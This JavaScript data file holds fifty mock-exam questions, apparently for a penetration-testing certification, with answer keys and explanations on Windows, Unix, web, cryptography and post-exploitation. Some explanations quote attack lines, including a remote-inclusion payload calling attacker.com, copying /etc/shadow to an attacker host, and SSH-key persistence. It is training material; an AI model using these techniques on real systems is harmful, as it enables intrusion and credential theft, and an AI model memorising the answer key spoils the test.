window.EXAM2 = {
  id: 2,
  title: "Mock Exam 2",
  subtitle: "Active Directory, Advanced Web & Exploitation Techniques",
  questions: [
    {id:"2-1",domain:"Windows",q:"nmap identifies SMB on TCP 445 with Windows XP SP2 via OS fingerprinting. Which nmap NSE script category checks for specific known vulnerabilities?",opts:["nmap --script vuln -p445 <target>","nmap --script smb-enum-users -p445 <target>","nmap --script brute -p445 <target>","nmap --script auth -p445 <target>"],ans:0,exp:"The 'vuln' script category runs vulnerability detection scripts including smb-check-vulns and ms-sql-info. For port 445 on XP SP2 this checks for MS08-067, MS17-010, and other known SMB vulnerabilities. 'auth' tests authentication, 'brute' does brute force, 'enum-users' enumerates users — different purposes entirely."},
    {id:"2-2",domain:"Windows",q:"Null session established. Which information CAN be enumerated via null session on Windows 2000 but NOT on Windows XP SP2 with default settings?",opts:["The machine NetBIOS name and domain membership","Unrestricted user and group enumeration via the SAM database","The list of open TCP ports on the target","The Windows version and patch level"],ans:1,exp:"Windows 2000 allows unrestricted null session enumeration of SAM (users, groups, password policy) by default. Windows XP SP2 and later restrict this via RestrictAnonymous=1 by default. NetBIOS names are still discoverable, port scanning doesn't require null sessions, and version detection uses different methods."},
    {id:"2-3",domain:"Windows",q:"nbtscan shows a host with NetBIOS suffix <20>. What service does this indicate is running?",opts:["Domain controller NETLOGON service","File and printer sharing (Server service) is active on this host","The host is the domain master browser","WINS proxy service is running"],ans:1,exp:"NetBIOS suffixes: <00>=hostname, <03>=messenger, <20>=File Server (Server service, sharing), <1C>=DC group, <1D>=master browser, <1E>=browser elections. <20> specifically means the Server service is running and file/print sharing is active — a target for SMB enumeration and share browsing."},
    {id:"2-4",domain:"Windows",q:"enum -U 192.168.1.1 against Windows 2000 shows 20 usernames without credentials. Why is this possible?",opts:["Windows 2000 doesn't implement access controls on SAM","Windows 2000 allows unauthenticated SAM enumeration via NULL sessions by default, a behaviour restricted in XP SP2+","The enum tool uses a zero-day in Windows 2000 authentication","Windows 2000 LDAP anonymous binds expose the full user database"],ans:1,exp:"Windows 2000 shipped with RestrictAnonymous=0 allowing null sessions to query the SAM for users, groups, and shares. Microsoft addressed this progressively: XP introduced RestrictAnonymous=1 as default, XP SP2 tightened further. The enum tool exploits this to enumerate without credentials via the IPC$ null session."},
    {id:"2-5",domain:"Windows",q:"Responder captures 'username::domain:challenge:NTProofStr:blob'. What hash type and cracking tool is used?",opts:["NTLMv1; use ophcrack with rainbow tables","NTLMv2 (Net-NTLMv2); crack offline using hashcat mode 5600","NTLM hash; pass directly to PsExec","Kerberos AP-REQ; use impacket-GetNPUsers"],ans:1,exp:"The format username::domain:ServerChallenge:NTProofStr:Blob is specifically NTLMv2 (Net-NTLMv2), captured by Responder or similar MITM tools. Hashcat mode 5600 cracks Net-NTLMv2. These cannot be passed directly (unlike NTLM hashes from SAM dumps) — they must be cracked first. Mode 5500 = Net-NTLMv1."},
    {id:"2-6",domain:"Windows",q:"Windows host with LM hashing enabled. Password is 'Password1'. How is it processed BEFORE hashing?",opts:["Stored as-is, split into 7-character halves","Converted to uppercase, padded to 14 chars with nulls, split into two 7-char halves each hashed with DES","Hashed as a whole 14-char value with a random salt","Converted to Unicode before splitting and hashing with DES-CBC"],ans:1,exp:"LM hash process: (1) convert ALL characters to UPPERCASE ('PASSWORD1'), (2) pad to exactly 14 chars with null bytes, (3) split into two 7-char halves: 'PASSWOR' and 'D1'+5 nulls, (4) each half used as a DES key to encrypt the constant string 'KGS!@#$%'. This is why 'Password123' and 'PASSWORD123' have the same LM hash."},
    {id:"2-7",domain:"Cryptography",q:"NTLMv1 traffic captured. Why is it weaker than NTLMv2 from a cracking perspective?",opts:["NTLMv1 uses shorter DES key length","NTLMv1 challenge-response can be cracked using rainbow tables for the known 8-byte server challenge; NTLMv2 includes a unique client nonce making each response unique","NTLMv1 transmits the password hash in the clear","NTLMv1 uses MD4 which is faster than HMAC-MD5"],ans:1,exp:"NTLMv1 uses a fixed 8-byte server challenge with a fixed computation. Rainbow tables for all 2^56 LM spaces (or the NT response) can be precomputed. Worse: the LM response in NTLMv1 can be extracted separately and cracked. NTLMv2's client nonce + HMAC-MD5 ensures every response is unique for the same password, defeating precomputation."},
    {id:"2-8",domain:"Windows",q:"AT command used: 'AT 18:12 regedt32 /i'. What privilege is required to use it?",opts:["Any domain user can schedule tasks with AT","Local administrator or SYSTEM privilege is required for the AT command","The account must be in the 'Backup Operators' group","Remote Desktop access is sufficient"],ans:1,exp:"The AT command (legacy task scheduler) requires local administrator or SYSTEM privileges to schedule tasks. Standard users cannot schedule tasks via AT. This is why the AT technique for accessing LSA secrets requires you to have already escalated to local admin — you then use AT to run regedt32 as SYSTEM."},
    {id:"2-9",domain:"Windows",q:"Password complexity disabled, minimum length 0. What password attack is valid that would carry lockout risk otherwise?",opts:["Kerberoasting of all service accounts","Spraying empty string or single-character passwords across all accounts without lockout risk","Exploiting MS-SAMR to dump all hashes","Using Mimikatz sekurlsa without SYSTEM access"],ans:1,exp:"With no complexity and zero minimum length, accounts may literally have no password. Testing an empty string (hydra's 'n' flag) or single-character passwords becomes valid without lockout risk. With lockout threshold=none AND minimum length=0, comprehensive low-attempt spraying (empty, username-as-password, common single chars) is safe and highly effective."},
    {id:"2-10",domain:"Windows",q:"GetAcct reports a user with account type 'SidTypeAlias'. What does SidTypeAlias represent?",opts:["A user account that has been renamed from its original name","A local group (alias group) such as built-in groups like 'Administrators' or 'Users'","A service account with an associated SPN","A computer account representing a domain-joined machine"],ans:1,exp:"SID types: SidTypeUser=user account, SidTypeGroup=global/universal security groups, SidTypeAlias=local groups (built-in groups like Administrators, Users, Backup Operators), SidTypeWellKnownGroup=well-known groups like Everyone, SidTypeComputer=computer account. Alias groups are local to the domain/machine and can contain accounts from trusted domains."},
    {id:"2-11",domain:"Unix",q:"'rusers -l 172.16.2.175' shows oracle logged into pts/1. Which RPC service provides this information?",opts:["rwhod on UDP 513","rusersd RPC service accessible via the portmapper (typically UDP 32776)","finger daemon on TCP 79","rexecd on TCP 512"],ans:1,exp:"rusers(1) queries the rusersd RPC service, registered with portmapper (port 111). The actual port varies (shown by rpcinfo -p — typically 32776 in the examples). rwho uses UDP 513 directly. finger uses TCP 79. rexecd uses TCP 512. rusersd reveals who is currently logged into Unix systems — valuable for targeting active sessions."},
    {id:"2-12",domain:"Unix",q:"/etc/hosts.equiv contains 'webserver01'. A user on webserver01 tries 'rsh fileserver01 ls /etc'. What authentication check occurs?",opts:["rshd checks password hash against /etc/shadow","rshd cross-references source IP against hosts.equiv and verifies username via the identd daemon on the source host","rshd checks the user exists in fileserver01's /etc/passwd only","rshd requires a valid SSH key pair between hosts"],ans:1,exp:"rshd authentication: (1) source IP/hostname must match an entry in /etc/hosts.equiv or user's ~/.rhosts, (2) the username is verified by querying the identd (auth) service on port 113 of the source host. identd returns the username associated with the connection's local port. Spoofing identd breaks this weak auth. No password is required."},
    {id:"2-13",domain:"Unix",q:"/etc/exports: '/data *(rw,no_root_squash)'. What does no_root_squash enable?",opts:["Any remote user can access /data without authentication","Remote root users are NOT squashed to anonymous UID, meaning root on the mounting host retains root access on the exported filesystem","SUID binaries on the exported filesystem execute with file owner privileges","The export is accessible to the entire internet without restriction"],ans:1,exp:"no_root_squash is the dangerous opposite of root_squash. With no_root_squash, if you mount this NFS share as root on your attacking machine, you have root-level access to the filesystem. You can: create SUID binaries, read root-owned files, modify /etc/passwd. Combined with '*(rw)' allowing any host to mount and write, this is a critical misconfiguration."},
    {id:"2-14",domain:"Unix",q:"Tester has local read access to another user's home directory. How is the .Xauthority file exploited?",opts:["Cookie used as a Kerberos ticket for network authentication","Copy .Xauthority and use 'xauth merge' to import the cookie, then connect to user's X display for screen capture and keystroke injection","Cookie reversed to recover the user's login password","Use cookie with xhost to grant all hosts access to the X display"],ans:1,exp:"MIT-MAGIC-COOKIE-1 in .Xauthority is the sole authentication mechanism for user-based X security. Copy the file, then: xauth merge /path/to/.Xauthority, then DISPLAY=:0 xterm (opens terminal in their session) or DISPLAY=:0 xwd -root (captures their screen). Complete session hijacking capability without knowing their password."},
    {id:"2-15",domain:"Unix",q:"Solaris 10 assessment. Which tool lists missing security patches given uname -a, pkginfo -x, and showrev -p outputs?",opts:["Nessus with Solaris plugin enabled","pca.pl using the patchdiag.xref cross-reference file from Oracle","oval-scan.sh using Solaris OVAL definitions","lynis with the solaris_patches module"],ans:1,exp:"Patch Check Advanced (pca.pl) by Martin Paul is the documented tool. It requires the three input files: uname -a (Solaris version/platform), pkginfo -x (installed packages), showrev -p (installed patches). It cross-references against patchdiag.xref (downloaded from Oracle/Sun) and outputs missing security patches with severity ratings."},
    {id:"2-16",domain:"Unix",q:"SMTP VRFY returns 550 for a username. What does 550 indicate?",opts:["The user exists but the mailbox is full","The VRFY command is disabled by the admin","The username is invalid or does not exist on this mail server","The server requires auth before VRFY"],ans:2,exp:"SMTP 550 = 'No such user here' / 'User unknown' — the username does not exist. This is the discriminating response for username enumeration: 250 = user valid, 550 = user invalid, 502 = VRFY disabled. If VRFY is disabled (502), try RCPT TO: method instead. The goal is to collect 250 responses which confirm valid accounts."},
    {id:"2-17",domain:"Unix",q:"SSH banner shows 'SSH-2.0-OpenSSH_5.1p1 Debian-5ubuntu1'. How is banner removal achieved in OpenSSH?",opts:["Set 'Banner /dev/null' in sshd_config","Edit the sshd binary with a hex editor to find and remove the version string","Set 'VersionAddendum none' to remove the OS suffix","Compile OpenSSH from source with version string excluded"],ans:1,exp:"The SSH version string is compiled into the binary. The only way to truly remove it is hex-editing the binary (find 'OpenSSH_5.1p1' and overwrite with nulls). Banner /dev/null removes the LOGIN banner (MOTD-style), not the protocol version string. VersionAddendum removes the 'Debian-5ubuntu1' suffix but 'OpenSSH_5.1p1' remains. The source shows hexedit being used to modify the sshd binary."},
    {id:"2-18",domain:"Unix",q:"'scp /etc/shadow attacker@192.168.1.1:/tmp/'. What prerequisite must be in place on the compromised host?",opts:["Attacker's IP in /etc/hosts.allow","SSH client installed on compromised host; attacker must have SSH listening; valid credentials from compromised host to attacker's SSH service","Root access required on compromised host since /etc/shadow is root-readable only","OpenSSL must be installed with a trusted CA cert"],ans:1,exp:"SCP requires: (1) OpenSSH client installed on the source (compromised) host, (2) an SSH server listening on the destination (attacker's machine), (3) valid credentials for the destination. Note: to read /etc/shadow, root access IS needed on the compromised host. But the SCP mechanism itself just needs SSH client + SSH server reachable on destination."},
    {id:"2-19",domain:"Unix",q:"'-rwsr-xr-x' has lowercase 's'. If it were uppercase 'S', what would that indicate?",opts:["Uppercase S = SGID bit instead of SUID","Uppercase S = SUID bit IS set but execute bit for owner is NOT set, so SUID has no practical effect","Uppercase S means binary is read-only to root","Uppercase S indicates a kernel-level restriction on SUID"],ans:1,exp:"Permission bit notation: Lowercase s/t = special bit SET AND execute bit SET. UPPERCASE S/T = special bit SET but execute bit NOT SET. So -rwSr-xr-x = SUID is set but the owner execute bit is off — SUID is meaningless without the execute bit since the file can't be executed at all. A 'broken' SUID configuration that doesn't actually grant elevated privileges."},
    {id:"2-20",domain:"Unix",q:"John the Ripper session interrupted. How do you resume it?",opts:["john --continue=/path/to/hashfile","john --restore[=session_name]","john --resume --format=NT hashfile","john --incremental --restart hashfile"],ans:1,exp:"John the Ripper saves session state in ~/.john/john.rec (or a named session file with --session=name). To resume: john --restore (restores default session) or john --restore=session_name. Continues from exactly where the session was interrupted, including the current wordlist position or incremental state. Very important for long cracking sessions."},
    {id:"2-21",domain:"Web",q:"MySQL blind injection: 'AND SLEEP(5)--' causes 5-second delay. What information can be extracted using time-based blind injection?",opts:["Only Boolean true/false conditions; data extraction not possible","Any database content can be extracted bit-by-bit using conditional time delays; full data extraction is possible though slow","Only the database version can be retrieved","sqlmap cannot automate extraction via time-based method"],ans:1,exp:"Time-based blind SQLi allows full data extraction through conditional queries: IF(condition, SLEEP(5), SLEEP(0)). Testing one bit at a time (e.g., IF(ORD(SUBSTR(password,1,1))>64, SLEEP(5), SLEEP(0))) extracts every character. sqlmap --technique=T fully automates this. It's slow but complete — binary search halves the number of queries needed per character."},
    {id:"2-22",domain:"Database",q:"Oracle database injection. Which syntax retrieves the Oracle database version?",opts:["SELECT version()","SELECT @@version","SELECT * FROM v$version WHERE banner LIKE 'Oracle%'","SELECT sqlite_version()"],ans:2,exp:"Oracle version syntax: SELECT * FROM v$version or SELECT banner FROM v$version WHERE banner LIKE 'Oracle%'. MySQL uses SELECT version() or SELECT @@version. MSSQL uses SELECT @@version. SQLite uses SELECT sqlite_version(). PostgreSQL uses SELECT version(). Knowing the correct syntax per database type is essential for CREST exam scenarios."},
    {id:"2-23",domain:"Web",q:"Java application uses PreparedStatements — SQL injection NOT possible. ORDER BY cannot use bind parameters. What alternative injection vector remains?",opts:["SQL injection via HTTP headers bypassing PreparedStatement protection","Second-order SQL injection via stored data used later in a non-parameterised query, or ORDER BY clause which can't use bind parameters","Time-based blind injection still works against PreparedStatements","NoSQL injection via JSON when app has hybrid database backend"],ans:1,exp:"PreparedStatements prevent first-order SQL injection in parameterised queries. But: (1) ORDER BY column names cannot be parameterised in standard SQL — if user-supplied column names are used without parameterisation, SQL injection is possible. (2) Second-order injection: data stored safely via PreparedStatement may later be retrieved and used unsafely in a dynamic query."},
    {id:"2-24",domain:"Web",q:"HTTP header: 'Authorization: Basic dXNlcjpwYXNz'. What are the actual credentials?",opts:["Encrypted; requires server's private key to decode","Base64 decoded: 'user:pass' — Basic auth is base64 encoded not encrypted, but HTTPS provides transport security","MD5 hash of username:password compared against stored hashes","SHA-1 hashed per the HTTP Basic Auth specification"],ans:1,exp:"HTTP Basic Authentication: credentials (username:password) are base64-encoded (NOT encrypted). base64 is an encoding, not encryption — anyone can decode it: echo 'dXNlcjpwYXNz' | base64 -d = 'user:pass'. HTTPS provides transport encryption. Without HTTPS, Basic auth credentials are trivially intercepted in transit."},
    {id:"2-25",domain:"Web",q:"'Content-Security-Policy: default-src self'. Tester injects '<script src=\"https://evil.com/xss.js\">'. What happens?",opts:["Browser executes the script since HTTPS sources are trusted by default-src self","Browser blocks the script; default-src 'self' restricts to same origin; external scripts are not permitted","WAF blocks the request before reaching the application","Browser requests a CSP bypass token from the server"],ans:1,exp:"CSP default-src 'self' means all resource types (scripts, styles, images, etc.) are only permitted from the same origin (scheme + host + port). An external script from evil.com is blocked by the browser before execution. Note: 'self' does NOT include subdomains. Violations can be reported via report-uri directive."},
    {id:"2-26",domain:"Web",q:"API accepts JSON: '{\"user\":\"admin\",\"debug\":false}'. Changing 'debug' to true reveals stack traces and DB queries. What vulnerability?",opts:["JSON injection allowing modification of server-side objects","Mass assignment vulnerability: a client-controlled parameter enables a server-side debug mode","Server-side template injection via the Boolean value","XXE injection via the JSON parser's XML fallback mode"],ans:1,exp:"Mass assignment (also called auto-binding or object injection): the application binds all JSON properties directly to a server-side object without filtering. The 'debug' property is an internal server setting not meant to be user-controlled. By sending debug:true, the client enables debug mode. In Rails, Node.js, Spring: this can also assign admin:true, isActive:true, etc."},
    {id:"2-27",domain:"Web",q:"File upload accepts images. Tester uploads 'shell.php.jpg'. Server strips extension to 'shell.php'. What misconfiguration enables this?",opts:["Vulnerable image processing library executing PHP code in EXIF headers","Server handles any file with PHP extension as executable PHP; upload function improperly strips extensions — tester has RCE","The webshell executes only if Apache uses mod_php with AllowOverride All","PHP execution requires disabling safe_mode in php.ini"],ans:1,exp:"Two misconfigurations combined: (1) The upload function's extension check is broken — it strips the last extension (.jpg) instead of whitelisting, leaving .php, and (2) the server executes .php files. Both conditions are needed. Correct fix: only allow explicitly whitelisted extensions AND never execute uploaded files. Store them outside webroot."},
    {id:"2-28",domain:"Web",q:"Open redirect: 'http://app.com/redirect?url=https://evil.com'. How is this most commonly weaponised?",opts:["Directly steal session cookies from the victim's browser","Craft a phishing URL using the trusted domain (app.com) to redirect victims to a malicious site, exploiting user trust in the original domain","Exploit SSRF by redirecting server to access internal resources","Bypass CSP by redirecting script sources through the trusted domain"],ans:1,exp:"Open redirect's primary weaponisation: phishing URLs. Users see 'https://trustedbank.com/redirect?url=https://evil-phishing.com' and trust the initial domain. Security awareness training teaches users to check the domain — but the trusted domain in the URL IS legitimate. Also used for OAuth token theft by redirecting to attacker-controlled URIs."},
    {id:"2-29",domain:"Web",q:"XXE found: file:///etc/passwd returns content. What is the next escalation step?",opts:["Exploit XXE for SSRF by changing file:// URI to http:// URI pointing to internal services","Use XXE to modify /etc/passwd directly","Chain XXE with XSS to steal admin cookies","Use XXE to extract compiled bytecode for reverse engineering"],ans:0,exp:"XXE escalation path: (1) File read confirmed with file:// URIs. (2) Escalate to SSRF using http:// URIs: <!ENTITY xxe SYSTEM 'http://169.254.169.254/latest/meta-data/'> probes AWS metadata. Or probe internal services: http://192.168.1.x:8080. (3) Out-of-band XXE (using DNS/HTTP callbacks) for blind exfiltration. SSRF via XXE is the documented next step."},
    {id:"2-30",domain:"Web",q:"Session tokens use: token = MD5(username + timestamp). What vulnerability is present?",opts:["MD5 is not suitable as it produces only 128-bit output","Token is predictable: attacker who observes a token and infers the timestamp can forge tokens for other users; MD5 is computationally fast enabling brute force","Timestamp introduces entropy making it more secure than a random value","MD5 session tokens vulnerable to length extension attacks"],ans:1,exp:"Predictable session tokens: (1) If you observe your own token, you know your username, so you can brute force the timestamp (finite range), (2) Once you can compute the token formula, generate tokens for target usernames (admin, etc.) across a timestamp range, (3) MD5 is fast — 8B hashes/second on GPU makes this trivial. Session tokens must use cryptographically secure random values."},
    {id:"2-31",domain:"Web",q:"SSRF vulnerability found. Which URI probes the AWS EC2 metadata service from within a cloud environment?",opts:["http://127.0.0.1/latest/meta-data/","http://169.254.169.254/latest/meta-data/","http://10.0.0.1/latest/meta-data/","http://192.168.1.1/latest/meta-data/"],ans:1,exp:"169.254.169.254 is the link-local address for cloud metadata services: AWS IMDSv1/v2, Azure IMDS, GCP metadata. AWS endpoint returns IAM role temporary credentials, instance ID, security groups, etc. This is a critical SSRF target in cloud environments. IMDSv2 requires a PUT request first to get a session token — IMDSv1 is directly readable."},
    {id:"2-32",domain:"Post-Exploitation",q:"hashcat mode -m 1000. Which hash type does mode 1000 target?",opts:["LM hashes","NTLM (NT) hashes","NTLMv2 Net-NTLMv2 hashes","Kerberos 5 TGS-REP etype 23 hashes"],ans:1,exp:"Hashcat modes: 1000=NTLM (NT hash from SAM), 3000=LM, 5500=Net-NTLMv1, 5600=Net-NTLMv2, 13100=Kerberos TGS-REP etype 23 (Kerberoasting), 18200=Kerberos AS-REP (AS-REP roasting), 1800=sha512crypt ($6$). Knowing these modes is essential for practical cracking work during and after CREST assessments."},
    {id:"2-33",domain:"Cryptography",q:"Developer claims signing with a private key encrypts for confidentiality. Why is this wrong?",opts:["Private keys cannot be used for encryption in RSA","Anyone with the public key (which is public) can decrypt; signing provides authenticity not confidentiality","Signature operation uses SHA hashing which cannot be reversed","RSA private key operations produce signatures larger than the original message"],ans:1,exp:"Asymmetric crypto operations: Encrypt=use recipient's PUBLIC key, Decrypt=use recipient's PRIVATE key, Sign=use sender's PRIVATE key, Verify=use sender's PUBLIC key. If you 'encrypt' with a private key, anyone with the public key (everyone) can 'decrypt' it — confidential to no one. It provides authenticity/non-repudiation. For confidentiality, encrypt with the RECIPIENT's public key."},
    {id:"2-34",domain:"Cryptography",q:"TLS certificate signed using SHA-1. What specific risk does SHA-1 signing present?",opts:["SHA-1 certificates cannot support EV status","SHA-1 vulnerable to collision attacks; attacker could potentially forge a certificate with the same SHA-1 hash undermining PKI trust","SHA-1 certificates have 1-year maximum validity","SHA-1 doesn't support ECDHE weakening forward secrecy"],ans:1,exp:"SHA-1 collision attacks (demonstrated by Google's SHAttered attack in 2017) produce two different documents with the same SHA-1 hash. For certificate signing, this theoretically allows forging a certificate that has the same signature as a legitimate one. Major browsers deprecated SHA-1 by 2017. SHA-256 (SHA-2 family) is the minimum recommended for certificate signing."},
    {id:"2-35",domain:"Cryptography",q:"Diffie-Hellman uses a 512-bit prime. What specific attack is feasible?",opts:["MITM replacing the prime with a known small prime","Logjam: precomputing discrete logarithm for commonly used small primes allowing passive decryption of sessions","Timing attack revealing the private exponent","Birthday attack against the session key"],ans:1,exp:"Logjam (2015): for DH with small or commonly-used primes, the discrete logarithm can be precomputed offline. A 512-bit prime can be 'number field sieved' in hours/days. If the server uses a common prime (used by many servers), the precomputation is done once and applies to all sessions using that prime. NIST recommends 2048-bit DH minimum."},
    {id:"2-36",domain:"Cryptography",q:"AES-128-CBC with a static, hardcoded IV. What specific attack does this enable?",opts:["Padding oracle attack since IV is not randomised","If same IV used for multiple encryptions with same key, XORing two ciphertexts of known plaintexts reveals XOR of plaintexts, leaking information","Brute force of the AES key is possible when IV is static","CBC chaining breaks if IV is static, causing decryption to fail"],ans:1,exp:"When IV is static (same for all messages), encrypting the same plaintext always produces the same ciphertext (since first CBC block = P XOR IV, always same). More critically: if C1=CBC(P1, IV, K) and C2=CBC(P2, IV, K), and you know P1, then C1 XOR C2 = P1 XOR P2 — revealing information about P2. Nonce reuse in CBC allows IV-based chosen plaintext attacks."},
    {id:"2-37",domain:"Cryptography",q:"CBC padding oracle vulnerability found. What can a fully weaponised padding oracle accomplish?",opts:["Recover the AES key directly from padding oracle responses","Decrypt arbitrary ciphertext blocks without knowing the encryption key, and potentially encrypt arbitrary plaintext","Perform DoS via infinite padding loop errors","Recover the HMAC signing key"],ans:1,exp:"CBC Padding Oracle: by making modified ciphertext requests and observing valid/invalid padding responses, you can decrypt any ciphertext block-by-block without knowing the key. Full exploitation: decrypt entire ciphertext (e.g., extract plaintext session cookies) AND encrypt arbitrary plaintext (forge valid encrypted values). PKCS#7 padding validation must be constant-time to prevent this."},
    {id:"2-38",domain:"Post-Exploitation",q:"Meterpreter session as 'NT AUTHORITY\\NETWORK SERVICE'. Which module and condition enables escalation to SYSTEM via token impersonation?",opts:["use incognito; NETWORK SERVICE must have SeImpersonatePrivilege (present by default on Windows)","use priv; current user must be in local Administrators group","use getsystem; must be a running SYSTEM process to migrate into","use escalate; a kernel exploit must be pre-loaded"],ans:0,exp:"SeImpersonatePrivilege is granted by default to IIS application pools, SQL Server service accounts, and NETWORK SERVICE on Windows. This privilege allows impersonating tokens — the basis of Potato attacks (JuicyPotato, PrintSpoofer, etc.) and incognito token stealing. 'use incognito' + 'impersonate_token' can grab SYSTEM tokens if they're available in the process list."},
    {id:"2-39",domain:"Unix",q:"Root process PID 1337. Using /proc filesystem, how do you read its environment variables?",opts:["cat /proc/1337/status | grep Env","cat /proc/1337/environ | tr '\\0' '\\n'","ps aux --env 1337","strings /proc/1337/mem | grep PATH"],ans:1,exp:"/proc/<PID>/environ contains process environment variables separated by null bytes (\\0). tr '\\0' '\\n' converts null separators to newlines for readable output. This may contain credentials, API keys, database passwords, etc. that the process was started with. Root may be needed to read /proc/<PID>/environ for processes owned by other users."},
    {id:"2-40",domain:"Unix",q:"After gaining root on Unix, how to maintain SSH-based persistence without creating new user accounts?",opts:["Add a public key to /root/.ssh/authorized_keys for passwordless root SSH access","Set root password to a known value and enable PermitRootLogin in sshd_config","Create a cron job re-establishing the shell if connection drops","Install a rootkit intercepting SSH authentication"],ans:0,exp:"Adding an SSH public key to /root/.ssh/authorized_keys enables passwordless root login using key-based auth (if PermitRootLogin=yes). This leaves no new user accounts, no changed passwords — a stealthy persistence mechanism. The authorized_keys file is rarely audited. Also add to other accounts' authorized_keys for deeper persistence."},
    {id:"2-41",domain:"Post-Exploitation",q:"Compromised Windows host has Windows Firewall blocking inbound. Meterpreter is running. Which command makes an internal service accessible on the attacker's machine?",opts:["portfwd add -l 8080 -p 80 -r 192.168.2.10","route add 192.168.2.0/24 <session_id>","socks 4 1080 -r 192.168.2.0/24","pivot add -t 192.168.2.10 -p 80 -l 8080"],ans:0,exp:"portfwd add -l <local_port> -p <remote_port> -r <remote_host>: listens on local port, forwards through Meterpreter session to the remote host:port. The inbound firewall blocks direct connections to the compromised host, but portfwd uses the existing outbound Meterpreter channel. 'route add' enables routing through the session for other tools."},
    {id:"2-42",domain:"Post-Exploitation",q:"searchsploit finds a local privilege escalation exploit. What does 'searchsploit -m <EDB-ID>' do?",opts:["searchsploit -x <EDB-ID> views the exploit without downloading","searchsploit -m <EDB-ID> mirrors/copies the exploit file to the current working directory","searchsploit --download <EDB-ID> fetches compiled binary","searchsploit -c <EDB-ID> compiles the exploit automatically"],ans:1,exp:"searchsploit options: -m <id> = mirror (copy) the exploit file to current directory, -x <id> = examine/view the exploit file in a pager, -p <id> = print the full path, -j = output JSON, --update = update the exploit-db database. Using -m copies the file so you can compile/modify it. Always read the exploit code before running it."},
    {id:"2-43",domain:"Web",q:"PHP application has RFI enabled. Which PHP configuration directive makes RFI possible?",opts:["allow_url_fopen = On","allow_url_include = On","expose_php = On","register_globals = On"],ans:1,exp:"Remote File Inclusion (RFI) requires allow_url_include = On in php.ini. This enables include(), require(), include_once(), require_once() to accept http:// and ftp:// URLs, loading remote PHP files for execution. allow_url_fopen = On only enables file_get_contents() and similar functions to open URLs — not code execution via include. RFI payload: ?page=http://attacker.com/shell.php"},
    {id:"2-44",domain:"Web",q:"Apache Tomcat manager at /manager/html. Default credentials (tomcat:tomcat) accepted. Standard attack path to RCE?",opts:["Upload a JSP webshell via the /manager/html deploy function","Exploit Tomcat AJP connector (Ghostcat) to read arbitrary files","Use Tomcat manager API to reconfigure JVM classpath","Inject malicious Log4j payload via application context name"],ans:0,exp:"Tomcat Manager's deploy function uploads and deploys a WAR (Web Application Archive) file. A WAR containing a JSP webshell (e.g., cmd.jsp) deploys to the Tomcat webapps directory and can be accessed directly. Full RCE with the servlet container's privileges. This is a classic Tomcat attack documented in multiple certifications."},
    {id:"2-45",domain:"Web",q:"Host listening on TCP 8009. What service typically runs here and what attack is associated?",opts:["Jenkins CI; RCE via Groovy script console","Apache Tomcat AJP connector; Ghostcat (CVE-2020-1938) allowing file read and potential RCE","ElasticSearch; unauthenticated data access via REST API","RMI registry; Java deserialization attacks via ysoserial"],ans:1,exp:"TCP 8009 = Apache Tomcat AJP (Apache JServ Protocol) connector. Ghostcat (CVE-2020-1938, January 2020) is a critical file read (and limited RCE if file upload is possible) vulnerability in Tomcat's AJP connector. Affects all Tomcat versions before 9.0.31, 8.5.51, 7.0.100. The AJP connector should be disabled if not needed or restricted to localhost."},
    {id:"2-46",domain:"Web",q:"Jenkins at http://jenkins.internal:8080 with anonymous access and accessible Script Console. What does 'println \"id\".execute().text' demonstrate?",opts:["Prints the current Jenkins user's identity from the session","Executes the 'id' OS command and returns output, confirming RCE as the Jenkins service account","Returns the Jenkins job identifier for the current build","Tests the Groovy interpreter version without OS interaction"],ans:1,exp:"Jenkins Script Console executes Groovy code directly on the server. 'cmd'.execute().text runs OS commands via Java's Runtime.exec(). The result confirms: (1) OS command execution is possible, (2) the identity of the Jenkins process owner (often jenkins user, sometimes SYSTEM/root on misconfigured servers). Equivalent to a webshell — full server compromise is possible."},
    {id:"2-47",domain:"Post-Exploitation",q:"'run post/windows/gather/enum_domain' returns domain name, DC IP, DC hostname. What is the NEXT logical step?",opts:["Immediately run mimikatz to dump all domain credentials","Enumerate domain users and groups, identify privileged accounts, and plan lateral movement toward the DC","Run MS08-067 against the identified DC","Use portfwd to expose port 445 of the DC"],ans:1,exp:"Systematic attack methodology: information gathering before action. After identifying the DC, enumerate: domain users (net user /domain), domain admins (net group 'Domain Admins' /domain), current machine's role, any AD misconfigurations. Running mimikatz immediately or attacking the DC without reconnaissance wastes time and may fail or cause unnecessary disruption."},
    {id:"2-48",domain:"Post-Exploitation",q:"8-character password policy with complexity enabled. Hash database obtained. Which approach cracks the highest percentage fastest?",opts:["Pure brute force with all printable ASCII starting at 8 chars","Rules-based dictionary attack applying mangling rules to a quality wordlist like rockyou.txt","Rainbow table lookup for all 8-char passwords with full charset","Markov chain attack starting from uniform distribution"],ans:1,exp:"Rules-based attacks on quality wordlists (rockyou.txt has 14M+ real passwords) with mangling rules (capitalise first letter, append numbers 1-99, append !, leet substitutions) catches 60-80% of real-world passwords. Pure brute force at 8 chars with full charset (95^8 = 6.6 quadrillion) takes too long. Rainbow tables need precomputed tables for the exact charset/length combination."},
    {id:"2-49",domain:"Post-Exploitation",q:"secretsdump.py against a DC with domain admin credentials. What does '--use-vss' specifically do?",opts:["Uses VSS to create a snapshot of NTDS.dit, bypassing VSS-aware AV and file locking","Uses DCSync technique to pull hashes via replication without touching disk","Uses volume-level encryption to protect extracted hashes in transit","Mounts a virtual SCSI snapshot of the DC's NTDS volume"],ans:0,exp:"secretsdump.py --use-vss: creates a Volume Shadow Copy of the C: drive, copies NTDS.dit and the SYSTEM registry hive from the shadow copy (NTDS.dit is locked by AD while running), then parses them locally. Without --use-vss, secretsdump uses DCSync (replication). VSS method leaves VSS artefacts; DCSync is quieter if the account already has replication rights."},
    {id:"2-50",domain:"ActiveDirectory",q:"Domain admin TGT is 10 hours old with a 10-hour ticket lifetime. Impact on the attacker's ability to use this ticket?",opts:["Still usable since TGTs auto-renew when presented to KDC","TGT has expired; cannot be used for new TGS requests; existing open sessions may still function within their own lifetime","TGT can be renewed for up to 7 days by default using kinit -R","Ticket becomes invalid immediately upon extraction from memory"],ans:1,exp:"Kerberos TGTs have: MaxTicketAge (default 10 hours, initial validity) and MaxRenewAge (default 7 days, maximum renewability). An expired TGT cannot be used to request new TGS tickets. However, existing TGS service tickets derived from it remain valid until THEY expire. OPSEC: steal TGTs early in the engagement while they're still valid."},
